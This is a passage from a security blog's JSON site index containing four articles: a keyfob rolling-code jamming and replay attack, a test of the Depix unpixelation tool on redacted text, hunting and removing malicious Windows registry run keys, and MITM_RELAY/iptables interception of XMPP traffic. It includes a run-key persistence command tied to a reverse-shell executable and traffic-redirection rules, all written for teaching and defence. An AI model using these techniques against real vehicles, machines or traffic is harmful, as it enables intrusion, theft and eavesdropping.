to the car so that the signal can be both sent and received.\nFigure 3 - Basic functionality of a general Keyfob.\nThe key of such attack is Jamming, sending a strong signal that blocks the car receiver from detecting the message sent from the keyfob.\nSince the frequency of a signal depends on different factors, some of which are casual - like the temperature - the receiver has a range of accepted frequencies, also called bandwidth.\nThe Jamming signal must be sent within the car’s receiving window (or bandwidth), at a slightly moved frequency from the one used from the keyfob.\nFigure 4 - A representation of a Rolling Code Bypass attack, showing the jamming frequency within the car receiving window.\nThe tricky part of the attack is that, while jamming, the attacker has to be able to detect and filter the signal sent by the owner of the car trying to open his vehicle. If the attacker is able to do so, the rest of the path is just a matter of implementation.\nLooking at Figure 4, we can clearly see all the signals we are dealing with: the Jamming signal (Green), slightly moved from the actual frequency used from the keyfob (Pink), both within the car receiving window (Red).\nFigure 5 - A device jamming and storing the first code simultaneously.\nOnce the first code has been stored from the device used by the attacker (that usually is a computer with some radio dongles) and not received by the car because of the jamming, the owner of the car will think that the car did not received the signal because of other reasons and will try to open it again. While clicking the button the second time, the device will store the second signal, stop jamming and send the first signal in a matter of milliseconds.\nFigure 6 - A device jamming and storing the second code simultaneously.\nFigure 7 - A device sending the 1st code received, opening the car.\nThe car will receive the 1st signal from the device and open and the owner will think that now everything worked properly, but the reality is that the attacker will still own the 2nd code able to open the car.","tools-used#Tools Used":"In order to detect Radio frequencies from a computer, there’s the need to use radio peripherals capable of converting radio signals from analog to digital . In my experience, I tried to use all of the most well known ones, to then choose which is the best for transmitting, receiving and jamming (see section 3.3).\nMy choices have been the following:\n- HackRF: Best device for RFHacking so far. Wide range of frequencies handled, versatile, easy to use, quite a lot of documentation online. It’s been the most used hardware device for the entire research. [3]\n- Yard Stick One: Not much documentation online, I personally did not like the way it’s implemented with the RFcat firmware loaded. I ended up using it only for jamming. [4]\n- RTL SDR: Only able to receive signals. I’m not happy about this piece, it gets overheated very often until there’s the need to unplug it and wait for it to cool down. I used it initially to track signals, but once I started testing with the HackRF, there has not been the need to use it anymore."},"title":"Car Hacking - Manual Bypass of Modern Rolling Code Implementations"},"/articles/2021/08/2021-08-03-can-depix-deobfuscate-your-data/":{"data":{"":"","1-what-is-depix-and-how-is-it-used#\u003cstrong\u003e1. What is Depix and how is it used?\u003c/strong\u003e":"","21-reversing-pixelation#2.1 Reversing pixelation":"","22-why-is-there-a-concern#2.2 Why is there a concern? ":"","2what-is-depix-and-what-can-it-do#\u003cstrong\u003e2.What is Depix and what can it do?\u003c/strong\u003e":"","3-depix-in-action#\u003cstrong\u003e3. Depix in action\u003c/strong\u003e":"","31-setup-depix#\u003cstrong\u003e3.1 Setup Depix\u003c/strong\u003e":"","32-test-images#3.2 Test images":"","33-test-recovery#3.3 Test recovery":"","34-results#\u003cstrong\u003e3.4 Results\u003c/strong\u003e ":"","4-re-creating-the-test#\u003cstrong\u003e4. Re-creating the test\u003c/strong\u003e ":"","41-setup-part-two#4.1 Setup part two":"","42-a-disappointing-recovery#4.2  A disappointing recovery":"","5-challenge#\u003cstrong\u003e5. Challenge\u003c/strong\u003e":"The censored text cracking tool By Caleb Herbert\nIn this post, Caleb explores Depix and its potential to recover sensitive text from reports that were redacted by the original authors. You can use our guidance to enter the challenge and test your GPU’s mettle against the gauntlet we’ve thrown down!\n1. What is Depix and how is it used?When sensitive information is about to be displayed to a reader, an author may blur the sensitive text so it can no longer be recognised. Blurring is intended to be used to redact text FOREVER… but I think that isn’t true anymore. We have some tooling that can unblur that text, and uncover quite interesting things that the original authors would have rather we didn’t know.\nThis fascinating Twitter exchange offers the perfect example of how the Depix tool could be deployed to steal redacted, sensitive credit card information?!\n2.What is Depix and what can it do?Depix is a Python program designed to recover censored text to a readable format via a simple command. Sounds too good to be true right? In this post, we’ll be evaluating how effective Depix is at defeating obfuscation.\nThe Depix tool assumes that all text positioning of all characters is done at pixel level. Pixelation is an author’s attempt to redact and obfuscate specific chunks of text they consider to be sensitive. For example, a test report may pixelate and blur a user’s password that the tester had been able to recover. As a high-level overview, leveraging pixelation-as-redaction lowers the resolution and quality of an image to undermine its readability.\nA big caveat to Depix’s use-case is that it relies on the redaction tool operating in a specific way: the text must have been pixelated with a linear box filter, since it processes every block separately. What this means is that the tool takes a quadrant of the pixels and overwrites them based on specific averages of those collected pixels. If you have obfuscated your sensitive text by using a nice thick, opaque box then you don’t have anything to worry about….but if you used pixelation as obfuscation, then you may have 99 problems and de-obfuscation is one.\n2.1 Reversing pixelation Given that the algorithm that Depix un-pixelates the text follows a specific ‘recipe’, it may not always be effective.\nDepix deploys almost a brute force method to recover the original text. It takes all printable characters and then begins to pixelate these characters in different combinations. This brute force is compared with the original, blurred text and continues until the same pixelated, numeric value can be replicated.\n2.2 Why is there a concern? Depix could have a serious impact on the existing archive of documents and videos that exist across the internet.\nThe possibility of this tool means any files which have been redacted and publicly disclosed, or YouTube videos which have passwords/texts or IPs redacted can be recovered and stolen. If malicious actors, organisation competitors, or even script kiddies got their hands on this, the censored private information would be at serious risk. They would only need to screenshot/download the files or images and run Depix against it. Granted, they’d have to have used a specific set of tools to censor the text but if so, the risk remains. 3. Depix in actionWe’ve teased you enough, let’s see this tool in action!\nWe’re going to do this twice. The first time we’ll be using the author’s practice example, to ensure the tooling works as expected. The second time we’ll conjure up our own redacted, pixelated image and see how well the tooling still recovers the original text. 3.1 Setup Depix Go to the Github repo for Depix, and download the .ZIP that contains all of the tooling. Extract the .ZIP in a directory you are happy with.\nYou’ll want to traverse to two directories down (/Depix-main/Depix-main) and then install the requirements that Depix requires to work\n3.2 Test images There are two important directories we’ll need for this experiment: /testimages/ and /searchimages/ The test image directory includes censored text which you can practice recovering. The search image directory includes images which are used like a dictionary to recover pixelated text. The image includes all upper- and lower-case alphanumeric letters with and without spaces for testing purposes. Close up, the above image looks like this - a collection of printable characters. 3.2.1 De Bruijn sequence Interestingly, the above image can actually be re-created fresh on your own local machine. You don’t have to do this, as a sequence is already provided for you. However, it is interesting to see how it is produced.\nIn the ether of the internet, there is this orphaned script that will produce the sequence of printable characters necessary to also use Depix.\n3.3 Test recovery To recover redacted text there are specific methods, depending on the tools that obfuscated the original text. This is a significant limitation that the original author recognises, however we’ll put that aside for now and come back to it later. If Notepad is used and pixelated with Greenshot we need the following command: python3 depix.py -p images/testimages/testimage3_pixels.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o images/output.png The command specifies the Path to the Pixelated Image (-p), Path to the Search Image (-s) and Path to Output (-o). If sublime text editor is used and pixelated with Gimp, this command is used: python3 depix.py -p images/testimages/sublime_screenshot_pixels_gimp.png -s images/searchimages/debruin_sublime_Linux_small.png --backgroundcolor 40,41,35 --averagetype linear The backgroundcolour option filters out the coloured background of the editor and specifies the linear averagetype as that’s the default averaging within Gimp. 3.3.1 Example This example leverages the first instance of Notepad \u0026 Greenshot. In the image below, we see that depix begins brute forcing the images for a match.\nRemember, it isn’t actually attacking the pixelated image. Rather, it leverages the De Bruijn image (with all the printable characters) to generate combinations of letters that can be pixelated to match the obfuscated image. Depending on the size of the redacted image this can take a while. We used the author’s original, example image. As this was the ‘ideal’ condition to operate under, the brute force took around 60-90 seconds to complete! 3.4 Results This was the censored file we tested against - not a very pretty sight, but very redacted nonetheless. This obfuscated image was fed into Depix. These are the results from the brute force.\nAlthough the results aren’t perfect. We are still able to interpret the results. For reference, the original message said, “Hello from the other side.” Not bad. It’s pretty good\nWe’re 10 layers deep in meme culture with this one\n4. Re-creating the test In our example we were operating under ideal conditions. As we know, in the real world, nefarious activities hardly ever take place under ideal conditions!\nLet’s recreate the experiment. This time, it will be original content, not the author’s supplied example: we’ll create our own text, obfuscate it, and try to brute force it.\n4.1 Setup part two We opened Notepad on our Windows machine. We added the shameless plug text we wanted to redact:\nIn order to pixelate this text, I used Depix’s example obfuscator: genpixed.py I was able to redact the text inside the image. Greenshot would be useful if only key words were redacted but to show it’s capability I redacted the whole thing: python genpixed.py -i Capture.PNG -o Capture1.PNG with -i being the input image and -o being the output image.\n4.2 A disappointing recovery To then recover this obfuscated text, we ran this big old one-liner:\npython depix.py -p Capture1.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpace d.png -o images/output1.png After around 45/50 minutes, Depix finally had a returned output… unfortunately it failed to recover the pixelated text. We wondered if this was due to the length of the text we offered Depix. So we re-created this experiment with “Hello World”. The results still did not yield success.\nThis could be due to a number of reasons:\nMinor issues in the pixel layout The character font is different A faulty De Bruijn image is leveraged for the dictionary attack Or good old human error Regardless, one or more of these issues frustrated Depix and it failed to depixelate our original content. Whereas I’m sure it has a strong potential in the future, It currently has a limited scope of what it can return.\n5. Reviewing DepixDepix’s python program was straightforward to use. Under the ideal demo example conditions, the results were impressive considering how pixelated the sample was beforehand. But it wasn’t perfect and failed to work for our real-life original content, though we gave some reasons why that could be the case.\nIn addition, Depix isn’t the answer to deobfuscating all pixelated text. There are only a couple of situations where it works. If the pixelation scale or cell size was different, the results would return nothing. If the pixelation was done with a tool other than the supported ones, it simply does not work. Moreover, you’d have to arbitrarily know or guess the specific tools used and hope that the Depix tool would work at de-obfuscating them. In the author’s Github, they recognise this current limitation. The Depix tool poses minimal risk to security at present, as it requires specific criteria to be met to be effective.\nFor now, however, there is a small chance that users can depixelate images, so it’s recommended to use a full box at full opacity to redact files. You can pick a less offensive colour of course\n5. ChallengeIf you fancy having a go at this yourself, and your GPU is beefy enough for the Herculean challenge, we’d love for you to have a go at de-obfuscating this image. If you crack the code, @ us on Twitter and we’ll organise for something interesting to be delivered to you. If you do use Depix (even outside of our challenge), we would be interested to hear about your experience. Let us know on twitter: @JumpsecLabs Caleb Herbert is a Red Team Researcher @ JUMPSEC","5-reviewing-depix#5. Reviewing Depix":"","the-censored-text-cracking-tool#\u003cstrong\u003e\u003cem\u003eThe censored text cracking tool\u003c/em\u003e\u003c/strong\u003e":""},"title":"Can Depix deobfuscate your data?"},"/articles/2021/08/2021-08-11-running-once-running-twice-pwned-windows-registry-run-keys/":{"data":{"":"By Dray Agha\nThe Windows registry is a vast and complex topic and cannot be understood and defended in one article. One particular area of interest from a security perspective is registry run keys. In this article, we discuss who uses run keys, how to uncover abuse, and how to eradicate evil from them. ","an-introduction-to-run-keys#An Introduction to Run Keys":"What are registry run keys? Run keys are an obscure mechanism of the registry to execute something on a Windows system when a user logs in or the machine boots up. A number of advanced adversaries have abused run keys due to their problematic nature. For example, Fancy Bear (also known as APT28), TA456, and Group 123 enjoy weaponizing run keys to achieve persistent access to a compromised network. Run keys have housed all manner of malicious content - from simple executables to macro-riddled spreadsheets.\nMITRE ATT\u0026CK® records this particular persistence tactic as the sub-technique T1547.001. It is not a super common technique for adversarial campaigns, however it can offer ardent persistence - all the more reason for you and I to explore this obscurity further. Though advanced attackers abuse run keys on occasion, I find it is a mechanism that is not discussed widely enough, even though it is quite straightforward to query run keys for evil. The silence on this registry capability isn’t from technical gaps across the infosec community. Rather, run keys are an unexpected executable component of the ‘config database’ that is the Windows registry. This means they often don’t get the same level of attention compared to bigger, more well-known attacker techniques and OS components. However, I recently came across this interesting snippet on the infosec social circuit:\nBefore we get into how to hunt for malicious run keys, let’s detour down the Windows registry. ","eradicating-run-key-evil#Eradicating Run Key Evil":"It’s time. Be surgical here. If you aren’t precise in your commands, you will accidentally remove run key entries that are legitimate. It’s important you remove with -verbose too and double-check it has gone, to make sure you have removed what you think you have. Off the back of our PowerShell for loop, copy and paste the full path location that the evil was detected. And double check this is where the malicious run key resides.\nGet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" | select -property * -exclude PS*| fl Then pick the EXACT name of the run key entry you want to remove. Copy paste it, include any special characters too please. Don’t copy the executable details that come after the colon ( : )\nRemove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" -Name \"*Run Safe Mode too\" -verbose We get our verbose message returned to us confirming that we are indeed removing the run key we think we are.\nThen check again to be sure it’s gone. If you still have the malicious run key here, double check you have copied and pasted appropriately, as fat-fingering paths and registry names are very real problems.\nGet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" | select -property * -exclude PS*| fl ","finding-run-key-evil#Finding Run Key evil":"A quick Powershell ‘for loop’ can collect the contents of these four registry locations. When drafting this script, I (and now you, too) made life easier by ensuring the code produced output that was pre-filtered and added colours. This will make our task that bit easier to determine IF something abnormal (read: evil) exists and WHERE it exists.\n$items = @(\"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\",\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"); foreach ($item in $items) { write-host \"----Reg location is $item----\" -ForegroundColor Magenta; get-itemproperty -path \"$item\" | select -property * -exclude PS* | fl } And if we look hard enough, we identify something abnormal. Once we take the executable and reverse engineer it, we can determine it is a malicious executable from the adversary. If you identify a malicious run key, you are of course obliged to remove it from the machine. Let’s discuss how in a moment, after we discuss what this evil looks like from a SIEM / SOC perspective.","finding-run-keys#Finding Run Keys":"There are a number of places where malicious run keys can be deployed. We’re just going to focus on the top four locations, but if you read some red team documentation you’ll find some more registry locations to deploy run key persistence. Anyway, in the Windows registry, if you look under HKey Local Machine and Current User, and traverse a couple of directories, you’ll find Run and RunOnce. \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" The directories are important here. The behaviour of the run key is contingent on the registry location it is written in: If you see something written in HKLM:\\ it means this was written as a high-privileged user (most likely Admin) or SYSTEM. Run keys written here can execute when the machine boots up If you see something something written in HKCU:\\ it means this was written as just a normal user Run keys written here will only execute when the user logs in. If you see something written to \\RunOnce it will be removed after execution If you see something written in \\Run it will not be removed after execution These can be complicated by the special character behaviour that we already discussed. ","hunting-run-keys#Hunting Run Keys":"\nIs this your face right now? This was my face when I first encountered run keys. This may actually be my face all the time, to be honest. #blueteamproblems\nAlthough run keys may seem complicated and obscure, I promise you they are anything but. They are wonderfully easy to query and monitor, and they show up fabulously in a SIEM when an adversary manipulates their values. Let’s prove it together.","malicious-run-keys#Malicious Run Keys":"Let us emulate some of the adversaries’ behaviour. We will insert some malice onto a run key, and then I will show you:\nFirst, how to loop through and find it automatically;\nSecond, how you eradicate it from the machine without damaging the other legitimate run keys.\nPretend we have pwned a machine, and are looking to maintain persistence. We compile evilcommand.exe, which bypasses all anti-virus known to man and gives us a reverse shell. We can force one of the run keys to execute our malicious program:\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" -Name '!Delete After Running' -Value \"evilcommand.exe\" If you append `-whatif` to the end of a lot of powershell one-liners, it will not actually run your command. Instead, it will show you what the effect COULD be if you ran it. When you want to really run something, tag on `-verbose` so you can get confirmation that the PowerShell you expected has taken effect. Without all of the noise, this is what we have forcibly co-opted the run key to do for us: we have created a run key named “Delete_After_Running”, whose execution value will be “evilcommand.exe”. Notice the exclamation point, which as we have discussed will ensure the program will run before it self-deletes, guaranteeing our successful re-entry to this compromised machine.\nThe Task Scheduler is oblivious to this. It does not and cannot recognise that this run key task has been scheduled. If I were Microsoft, I’d probably include that functionality in Task Scheduler…","monitoring-for-evil#Monitoring for Evil":"Let’s discuss what this looks like from a detection and monitoring perspective. For our example, we are using the built-in Windows Event Viewer, and then adding Sysmon and Florian Roth’s config of rules for detection. You could then feed this sysmon log data into a SIEM, and monitor hundreds of thousands of endpoints for run key malice (and other stuff too).\nThere is a wealth of information here worth considering: The BLUE arrows: event info\nThe Event ID 13 involves registry values modification, and this ID will be consistent in any environment. The EventType and Task Category spell out exactly what is happening here too: a registry value is being set The RED arrows**:** specific info\nThe TargetObject shows the full path for the run key registry we are changing. It also shows the name we called it, and includes the special character that modifies the behaviour The Details section shows the command / executable the run key is forced to run The PINK arrow: MITRE ATT\u0026CK reference\nThis may not be in every sysmon config. However Florian Roth includes the MITRE ATT\u0026CK tactic number in a particular event. Rather than get attack alerts for every Event 13, I’d recommend you go on a bit of a discovery exercise of what the run keys in your environment normally do. Across the entire enterprise do they have the same consistent contents? Or does the finance department run software that legitimately alters the run key? Would you be able to baseline this and then create a small alert for any new, inconsistent run key changes to a workstation in the finance department?\nThis has greater value than hoping to catch one rogue Event 13 out of a million.\nInteractive detection If you want a more interactive detection experience, might I recommend a tool like Dr Michael Cohen’s Velociraptor?. Velocitaptor is a tool (and philosophy) that deserves its own article, so I will be brief here. Velociraptor is an endpoint response agent that you can install on every single endpoint across your enterprise, and orchestrate from one server via a web-app. This distributed tool allows us to then query thousands of machines at once. Built in to Velociraptor is a hunt that queries every Windows machine specifically for their startup process, and part of this hunt includes querying run keys. As you can see, this hunt targets a number of the registry run keys that our previous PowerShell query also hunted for. Velociraptor targets an additional few run keys, as well as some other startup locations (but I leave that to you to investigate this all further).\nIf we fire off this startup detection hunt, we will be given a beautifully formatted table of results. In real production environments, you will find more noise than this so be warned! But look at what we detected - a single machine in our domain currently running C:\\evil.exe, shocking stuff. Fortunately now we know and can eradicate it from the host - I’ll show you how. ","run-keys#Run keys":"I hope so far I have conveyed just how difficult it is to tame the registry. To make matters worse, run key capabilities are criminally under-documented by Microsoft, who devote a mere six paragraphs to them.\nRun keys live in the registry. They are configurable to allow a program to execute when a user logs in or the computer is turned on. “But hold on!”, I hear you angrily cry, “Windows already has a Task Scheduler, THAT’S how you schedule tasks!!!”\nWell, not according to our Lord and Saviour Bill Gates. Moreover, run keys have some crucial differences that make comparisons to Windows’ Task Scheduler somewhat limited.\nIn contrast to Windows Task Scheduler, registry run keys possess a number of unique characteristics:\nCharacter Limitations Run keys can only store commands that are less than 280 characters. So an adversaries’ one-liner must form as few characters as a Tweet. I hope Microsoft didn’t intend for THAT to be a low-tier defence mechanism, as your basic script-kiddie reverse shell will barely cost you 50 characters. Moreover, compiling your own malicious executable and firing it off via the run keys will cost you very few characters but achieve maximum effect. So whilst the character limitation is unique compared to other system timers, it’s a trivial obstacle. Special Character Behaviour Another unique feature of run key considers how special characters change the behaviour of the scheduled command. Specifically, the exclamation mark ( ! ) and the asterisk / wildcard ( * ). By default, the run key wipes itself after execution - whether it fails to execute its task or not. These two special characters can be deployed to alter this behaviour.\nIf, on your next threat hunting session or incident response, you see this bad boy right here with an exclamation mark, you have encountered a run key that will persist until it has run its allocated command for sure. If for whatever reason the evil command does not run, the exclamation mark ensures that it will not delete itself until it runs successfully. The prefixed exclamation of a run key can be defeated by booting the computer in Safe Mode. To ensure that a run key is executed regardless of boot mode, an adversary can leverage an asterisk / wildcard which forces the command to run. Run keys are configured to wipe themselves after running, by default, which means that unless your logging and detection is sharp, these kinds of malicious activities could go by unnoticed, unless you go through the painstaking process of forensically recovering the image of the machine","some-bedside-reading#Some Bedside Reading":"There are so many other janky registry entries that can do weird things with run keys. We didn’t mention, for example, how entire folders can become mechanisms of persistence via registry run keys! You can read more here, here, and here.\nIf you enjoyed this article or especially if you DIDN’T enjoy this article, give these other ones a go: looking at hacking cars and breaking their keyfob encryption; evaluating the potential de-obfuscate redacted text in sensitive documents; and advanced techniques to defend your C2’s honour.\nAny questions, comments, or criticisms please drop me a line\nTwitter Github\nDray Agha, Security Researcher","the-windows-registry#The Windows Registry":"The Windows registry is a labyrinthine place. On the surface it presents itself as a centralised database to store information pertaining to user and machine settings. The reality is that it’s more a menagerie of weird and wonderful capabilities that Microsoft sometimes obscurely document, despite these capabilities possessing devastating potential.\nI could spend hours writing about the inconsistencies and capriciousness of the Windows registry. Trying to understand the limits and parameters of its potential is truly maddening. It seems like the byzantine nature of the registry offers an adversary an unfair advantage to stash away their persistence mechanisms and skulk outside the network until the Blue Team has averted their gaze. Trying to decipher what is benign and what is malevolent in the windows registry can be considered Sisyphean, especially during an incident.","unpicking-run-keys#Unpicking Run Keys":"Run keys are obscure mechanisms of persistence for sure. But I hope this article has instilled confidence in how straightforward it is to monitor, detect, control, and remove any malicious activity involving your run keys.\nAs a defender, sometimes our roles are framed as being consistently at a disadvantage compared to the adversary. They can leverage zero-days, they can trick users, they can run across time zones with bigger budgets. Whilst we must consistently be at the top of our game, they only need to be lucky once.\nAll of this is true, but I find that sometimes we could invert this framing to focus on the advantages we possess compared to the attacker.\nThis is OUR environment. This is OUR registry. And these are OUR run keys. We know how it all works, and we should be here waiting for the adversary to so much as sneeze in our domain without us knowing about it. Sure, have a foothold. But we aren’t naive, we expect compromise. And we will catch you, kick you out, and ensure your future attempts at re-entry are that bit harder. Understand what is normal for your environment so you know when a registry run key manipulation is out of place, and foster a hostile network so an adversary can’t move an inch without you knowing about it and containing them.\nThere’s a lot to do and never enough time or resource to do it, but that’s why we’re in infosec right? ","what-do-run-keys-look-like-irl-#What do Run Keys look like IRL ?":"In real life, you actually have to sift a little bit of the registry’s noise to get to the meat of a run key. Allow me to share with you two examples, where the first has not been filtered with PowerShell, and the second is enjoying a luxurious yet temporal life as filtered PowerShell.\nLook at this mess. What even is this? We don’t even need the stuff highlighted in the red box, it’s just noise. We know this is the ‘HKLM’ Drive and ‘Run’ ChildName……we know that because we are the ones who traversed here! Honestly…\nLet’s filter out the noise with some PowerShell:\nGet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" | select -property * -exclude PS* | fl Look at how superior this is. Imagine running this glorious filtered-one-liner, and getting thousands of endpoints returning information in this kind of clear, noise-free way; the stuff Blue Team dreams are made of. This kind of filtered PowerShell is fantastically suited to be run enterprise-wide to identify anomalies beyond the standard builds across your network. If you look in the run keys, you’ll find the entries’ name and accompanying commands (name: command). The legitimate contents of the run keys can vary and it’s your task to understand what is normal in your enterprise, as this will allow abnormal inconsistencies to stand out. As you hunt, you may want to filter out legitimate startup items in the registry runkeys. This is easily done. Using the same PowerShell as above, we can use the `-exclude` flag which already removes `PS*`. Just add a comma, and remove the other run key names that you don’t want to see. Get-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" | select -property * -exclude PS*, Vmware*,bginfo* | fl "},"title":"Running Once, \u003cdel\u003eRunning Twice\u003c/del\u003e, Pwned! Windows Registry Run Keys"},"/articles/2021/08/2021-08-24-burpsuite-and-beyond/":{"data":{"getting-hands-on#Getting hands-on!":"Are you ready to do this yourself? You’ll need:\nMITM_RELAY script A proxy tool (Burp, in our case) Two mobile clients: talking to each other using an the app’s XMPP protocol, A firewall rule: needed to route the traffic from mobile client to relay server. ","introduction#Introduction":"By Muhammet Ali Arıtürk\nIn this article, Muhammet takes us on a deep technical journey to persevere beyond the limitations of the proxy tool Burp Suite, and explore non-HTTP, application-layer protocols using ‘MITM RELAY’.\nIntroductionAs an offensive security tester, we often rely on Burp Suite. While an excellent resource when penetration testing, it’s not without limitations, as we explored in our previous article on utilising custom python scripts. To get around some particular limitations in a recent case, I used a cool tool called MITM_RELAY which is described as a “hackish way to intercept and modify non-HTTP protocols through Burp \u0026 others”. This tool allows us to compensate for Burp Suite’s limitations and extend it’s proxying capabilities for protocols beyond HTTP. Let’s explore why this is important when looking to secure an application. ","proxying-xmpp-traffic-using-mitm-relay#Proxying XMPP traffic using MITM Relay":"As mentioned earlier, we are trying to understand whether Alpaca App is communicating securely. Because it communicates via XMPP, we need to intercept that traffic and then study it. Let’s explain that again through a diagram: Not bad. So now we have a limited tool (Burp Suite) and we have a tool that can upgrade it (MITM_RELAY), so let’s get to work combining this so Burp Suite can understand Alpaca App’s XMPP!\nBurp Suite has its own extension for XMPP protocol interception, but I didn’t find this to be as effective as the MITM_RELAY tool. The Burp XMPP extension would occasionally drop packets, which is obviously not ideal when trying to build a robust picture of the security of the app. The Burp extension, while having some good features, needed quite a bit of tinkering to make it work. In contrast, I found the MITM_RELAY tool easier to use, but really, you can use anything that you feel comfortable with!\nThe creators of the tool made a nice diagram below about how the tool works, and how to intercept different types of traffic via HTTP (Burp Suite) Proxy.\nDigging deeper, the relay server has three key functions:\nRelay Listener A listener for a specific protocol and a specific source port will forward the traffic to our target IP and target PORT Packet Wrapper and Unwrapper This component will wrap all traffic into HTTP form and deliver it to the proxy tool. When the proxy tool forwards the traffic on, it will unwrap the traffic to it’s original protocol) So XMPP —» HTTP —» XMPP Echo Web Server This web server is a required part of this. As we’re sending the request over out proxy tool there will need to be a response after we finish sending the request Let’s go through this step by step. Assume our first XMPP packet has left Alpaca App, and was intending to reach Alpaca Inc.’s servers out in the big internet. 1. It will pass through our relay server, be wrapped in HTTP, and sent to the Proxy server (Burp Suite)\n2. After completing the wrapping-modification of the initial request, we will send it to the Echo Web server. This will forward it to the upper level to unwrap it to the original protocol (XMPP) readying it to send to the Alpaca Inc. Server as originally intended:\n3. So far we have managed to successfully send Alpaca App’s XMPP traffic to the Alpaca Inc. server, situated on the internet. It is now the Alpaca Inc. server’s turn to answer us. Lets see how that works in return:\nThe application server then answers in the Alpaca app. We now have the ability to modify our requests to change the information we receive. 4. When we are done examining Alpaca Inc.’s server response, we will let the XMPP packet go back to the client-side, (the Alpaca App). The same wrapping, unwrapping, and echo repeating occurs here to deliver the traffic back. So far, so good? Are you doing alright? Here’s an alpaca meme to lighten things up.\nWe have followed the process from the first XMPP traffic from Alpaca App on our mobile phone, through our Burp Suite-MITM_RELAY that wraps it up in HTTP, and then when it unwraps it back to XMPP and gives it the Alpaca Inc. Server - and then back again through this whole apparatus.\nI hope you enjoyed the visuals, and they provided some benefit. Let’s open up the command-line, so you can replicate this and set this up too!","ready-to-start-testing#Ready to start testing? ":"Now that our environment is set up, let’s fire up our mobile application (Alpaca App) and see where the packets go.\nClient to Server In the top half of the screenshot (below), we can see MITM_RELAY confirm its listening configuration and then confirm it has received the new client (new connection) that it will forward on. The lower half of the screenshot is our Burp Suite proxy tool that is receiving relay’s forwarded information.\nServer to Client And on return from the Alpaca Inc. servers, Burp Suite intercepts the communication destined for the Alpaca mobile app. X-Mitm_Relay-to and X-Mitm_Relay-From indicates the changes between thick client and application server addresses dynamically, based on the where the packets come from.\nAlpaca App chat Let’s use the cool chat in the Alpaca App to send our best buddy a message.\nThis message goes from Alpaca App —» MITM_RELAY —» Burp Suite proxy. If we recall, this converts the original XMPP into HTTP, which Burp Suite can understand.\nWe can see the intercepted contents in Burp Suite:\nNow we have intercepted the message in the Alpaca App chat, we can drop or forward the message further. Let’s make sure it gets through.\nHere we can see the actual conversation between the two mobile devices. Both are using the Alpaca App and communicating through XMPP. ","setting-up-the-environment#Setting up the environment":"MITM_RELAY For our MITM_RELAY setup, let’s look at the parameters we need:\n-r: Relaying settings. This parameter helps us to configure the relay [local port] : [dest_host] : [dest_port] Or adding protocol: [udp:|tcp:] lport: rhost : rport Example: tcp:8083:142.250.187.238:443 -l : Relay listener. This is the address the relays will listen on. Be careful when setting this address, your relay listening address must be reachable from the client of you. And must be the same in –to–destination in iptables rule you use -p: The proxy parameter, in this case our proxy server will be in place Our MITM relay is now ready\nProxy Setup We then can set up the rest of our proxy tooling and client-side Alpaca mobile app communication. Our proxy tool (Burp Suite) is listening on 192.168.1.184:8083 I am using a XMPP based chat mobile application. You, however, can choose any kind of application you would like to test. Firewall Setup We will need to manipulate the firewall for our task. Fortunately for us, my colleague SHD already talks about how to use iptables to create super specific firewall changes.\nLets leverage a visual to show what we’ll need our firewall to do: Our firewall will need to do some very specific port forwarding…there are two ways to utilise iptables to achieve this task.\nYou can either forward one specific port on TCP/UDP for all destinations to the relay: iptables -t nat -A OUTPUT -p tcp --dport 5222 -j DNAT --to-destination 192.168.1.184:9876 Or you can forward one specific port on TCP/UDP for one specific destination to the relay:\niptables -t nat -A OUTPUT -p tcp -s DEST_IP--dport 5222 -j DNAT --to-destination 192.168.1.184:9876 For the application you are researching, you have the task of identifying which ports to use and forward to - I unfortunately do not have the answers for your application. But I do have the answers for the Alpaca App, so let’s keep going. ","simulating-a-man-in-the-middle#Simulating a man-in-the-middle":"Imagine a mobile application. We’ll call it Alpaca App.\nIt has loads of great features that keep you connected with your favourite Alpaca friends. Besides being cool, the mobile app needs to be secure when you’re using it to access the big bad internet. Our task in this article is to understand if the app is broadcasting and transferring data securely or insecurely enough for an adversary to intercept the traffic. This can also be understood as man-in-the-middle (MITM) attack, whereby a malicious (and nosy) actor eavesdrops on the network traffic that a machine is innocently transmitting and steals or manipulates the data for their evil purposes. An important tool for MITM research involves proxying, which acts as an intermediate between two machines - and can be weaponized for evil purposes. Burp Suite is a staple tool for studying web app and mobile app communications, as it proxies the information between the client and server so we can research exactly how the application works.\nDefinitions aside, let’s talk about the technical complications for proxying our specific mobile app. Take a big old sip of coffee, and let’s get to work.","the-limits-of-burp-suite#The limits of Burp Suite":"Burp Suite is able to catch HTTP communications. This is a specific application-layer protocol. The diagram below shows the process by which Burp Suite proxies communications over HTTP protocol. However, Burp Suite is ONLY able to proxy this specific protocol. Unfortunately, Alpaca App doesn’t use HTTP to communicate. It uses XMPP instead. So what now? The Extensible Messaging and Presence Protocol (XMPP for short) is another application-layer protocol that is some decades old now, and originally went by the name Jabber. Thankfully, we can use our new tool to intercept anything we want. ","there-and-back-again#There and back again":"The moral of this story is that we do not have to give up on our security tooling if it has default limitations. On the contrary, we can layer up the tools we use and extend the capability of the tools that we are comfortable with. In our example, we extended Burp Suite’s HTTP-default capabilities with MITM_RELAY so we could assess the Alpaca App that uses the XMPP protocol. I hope you found this useful, and remember it next time you need to research TEXT-based traffic in Non-HTTP protocols. Intercept everything and enjoy my friends!\nMuhammet Ali Arıtürk is a Security Researcher @ JUMPSEC. You can follow him on Twitter."},"title":"Burp Suite and 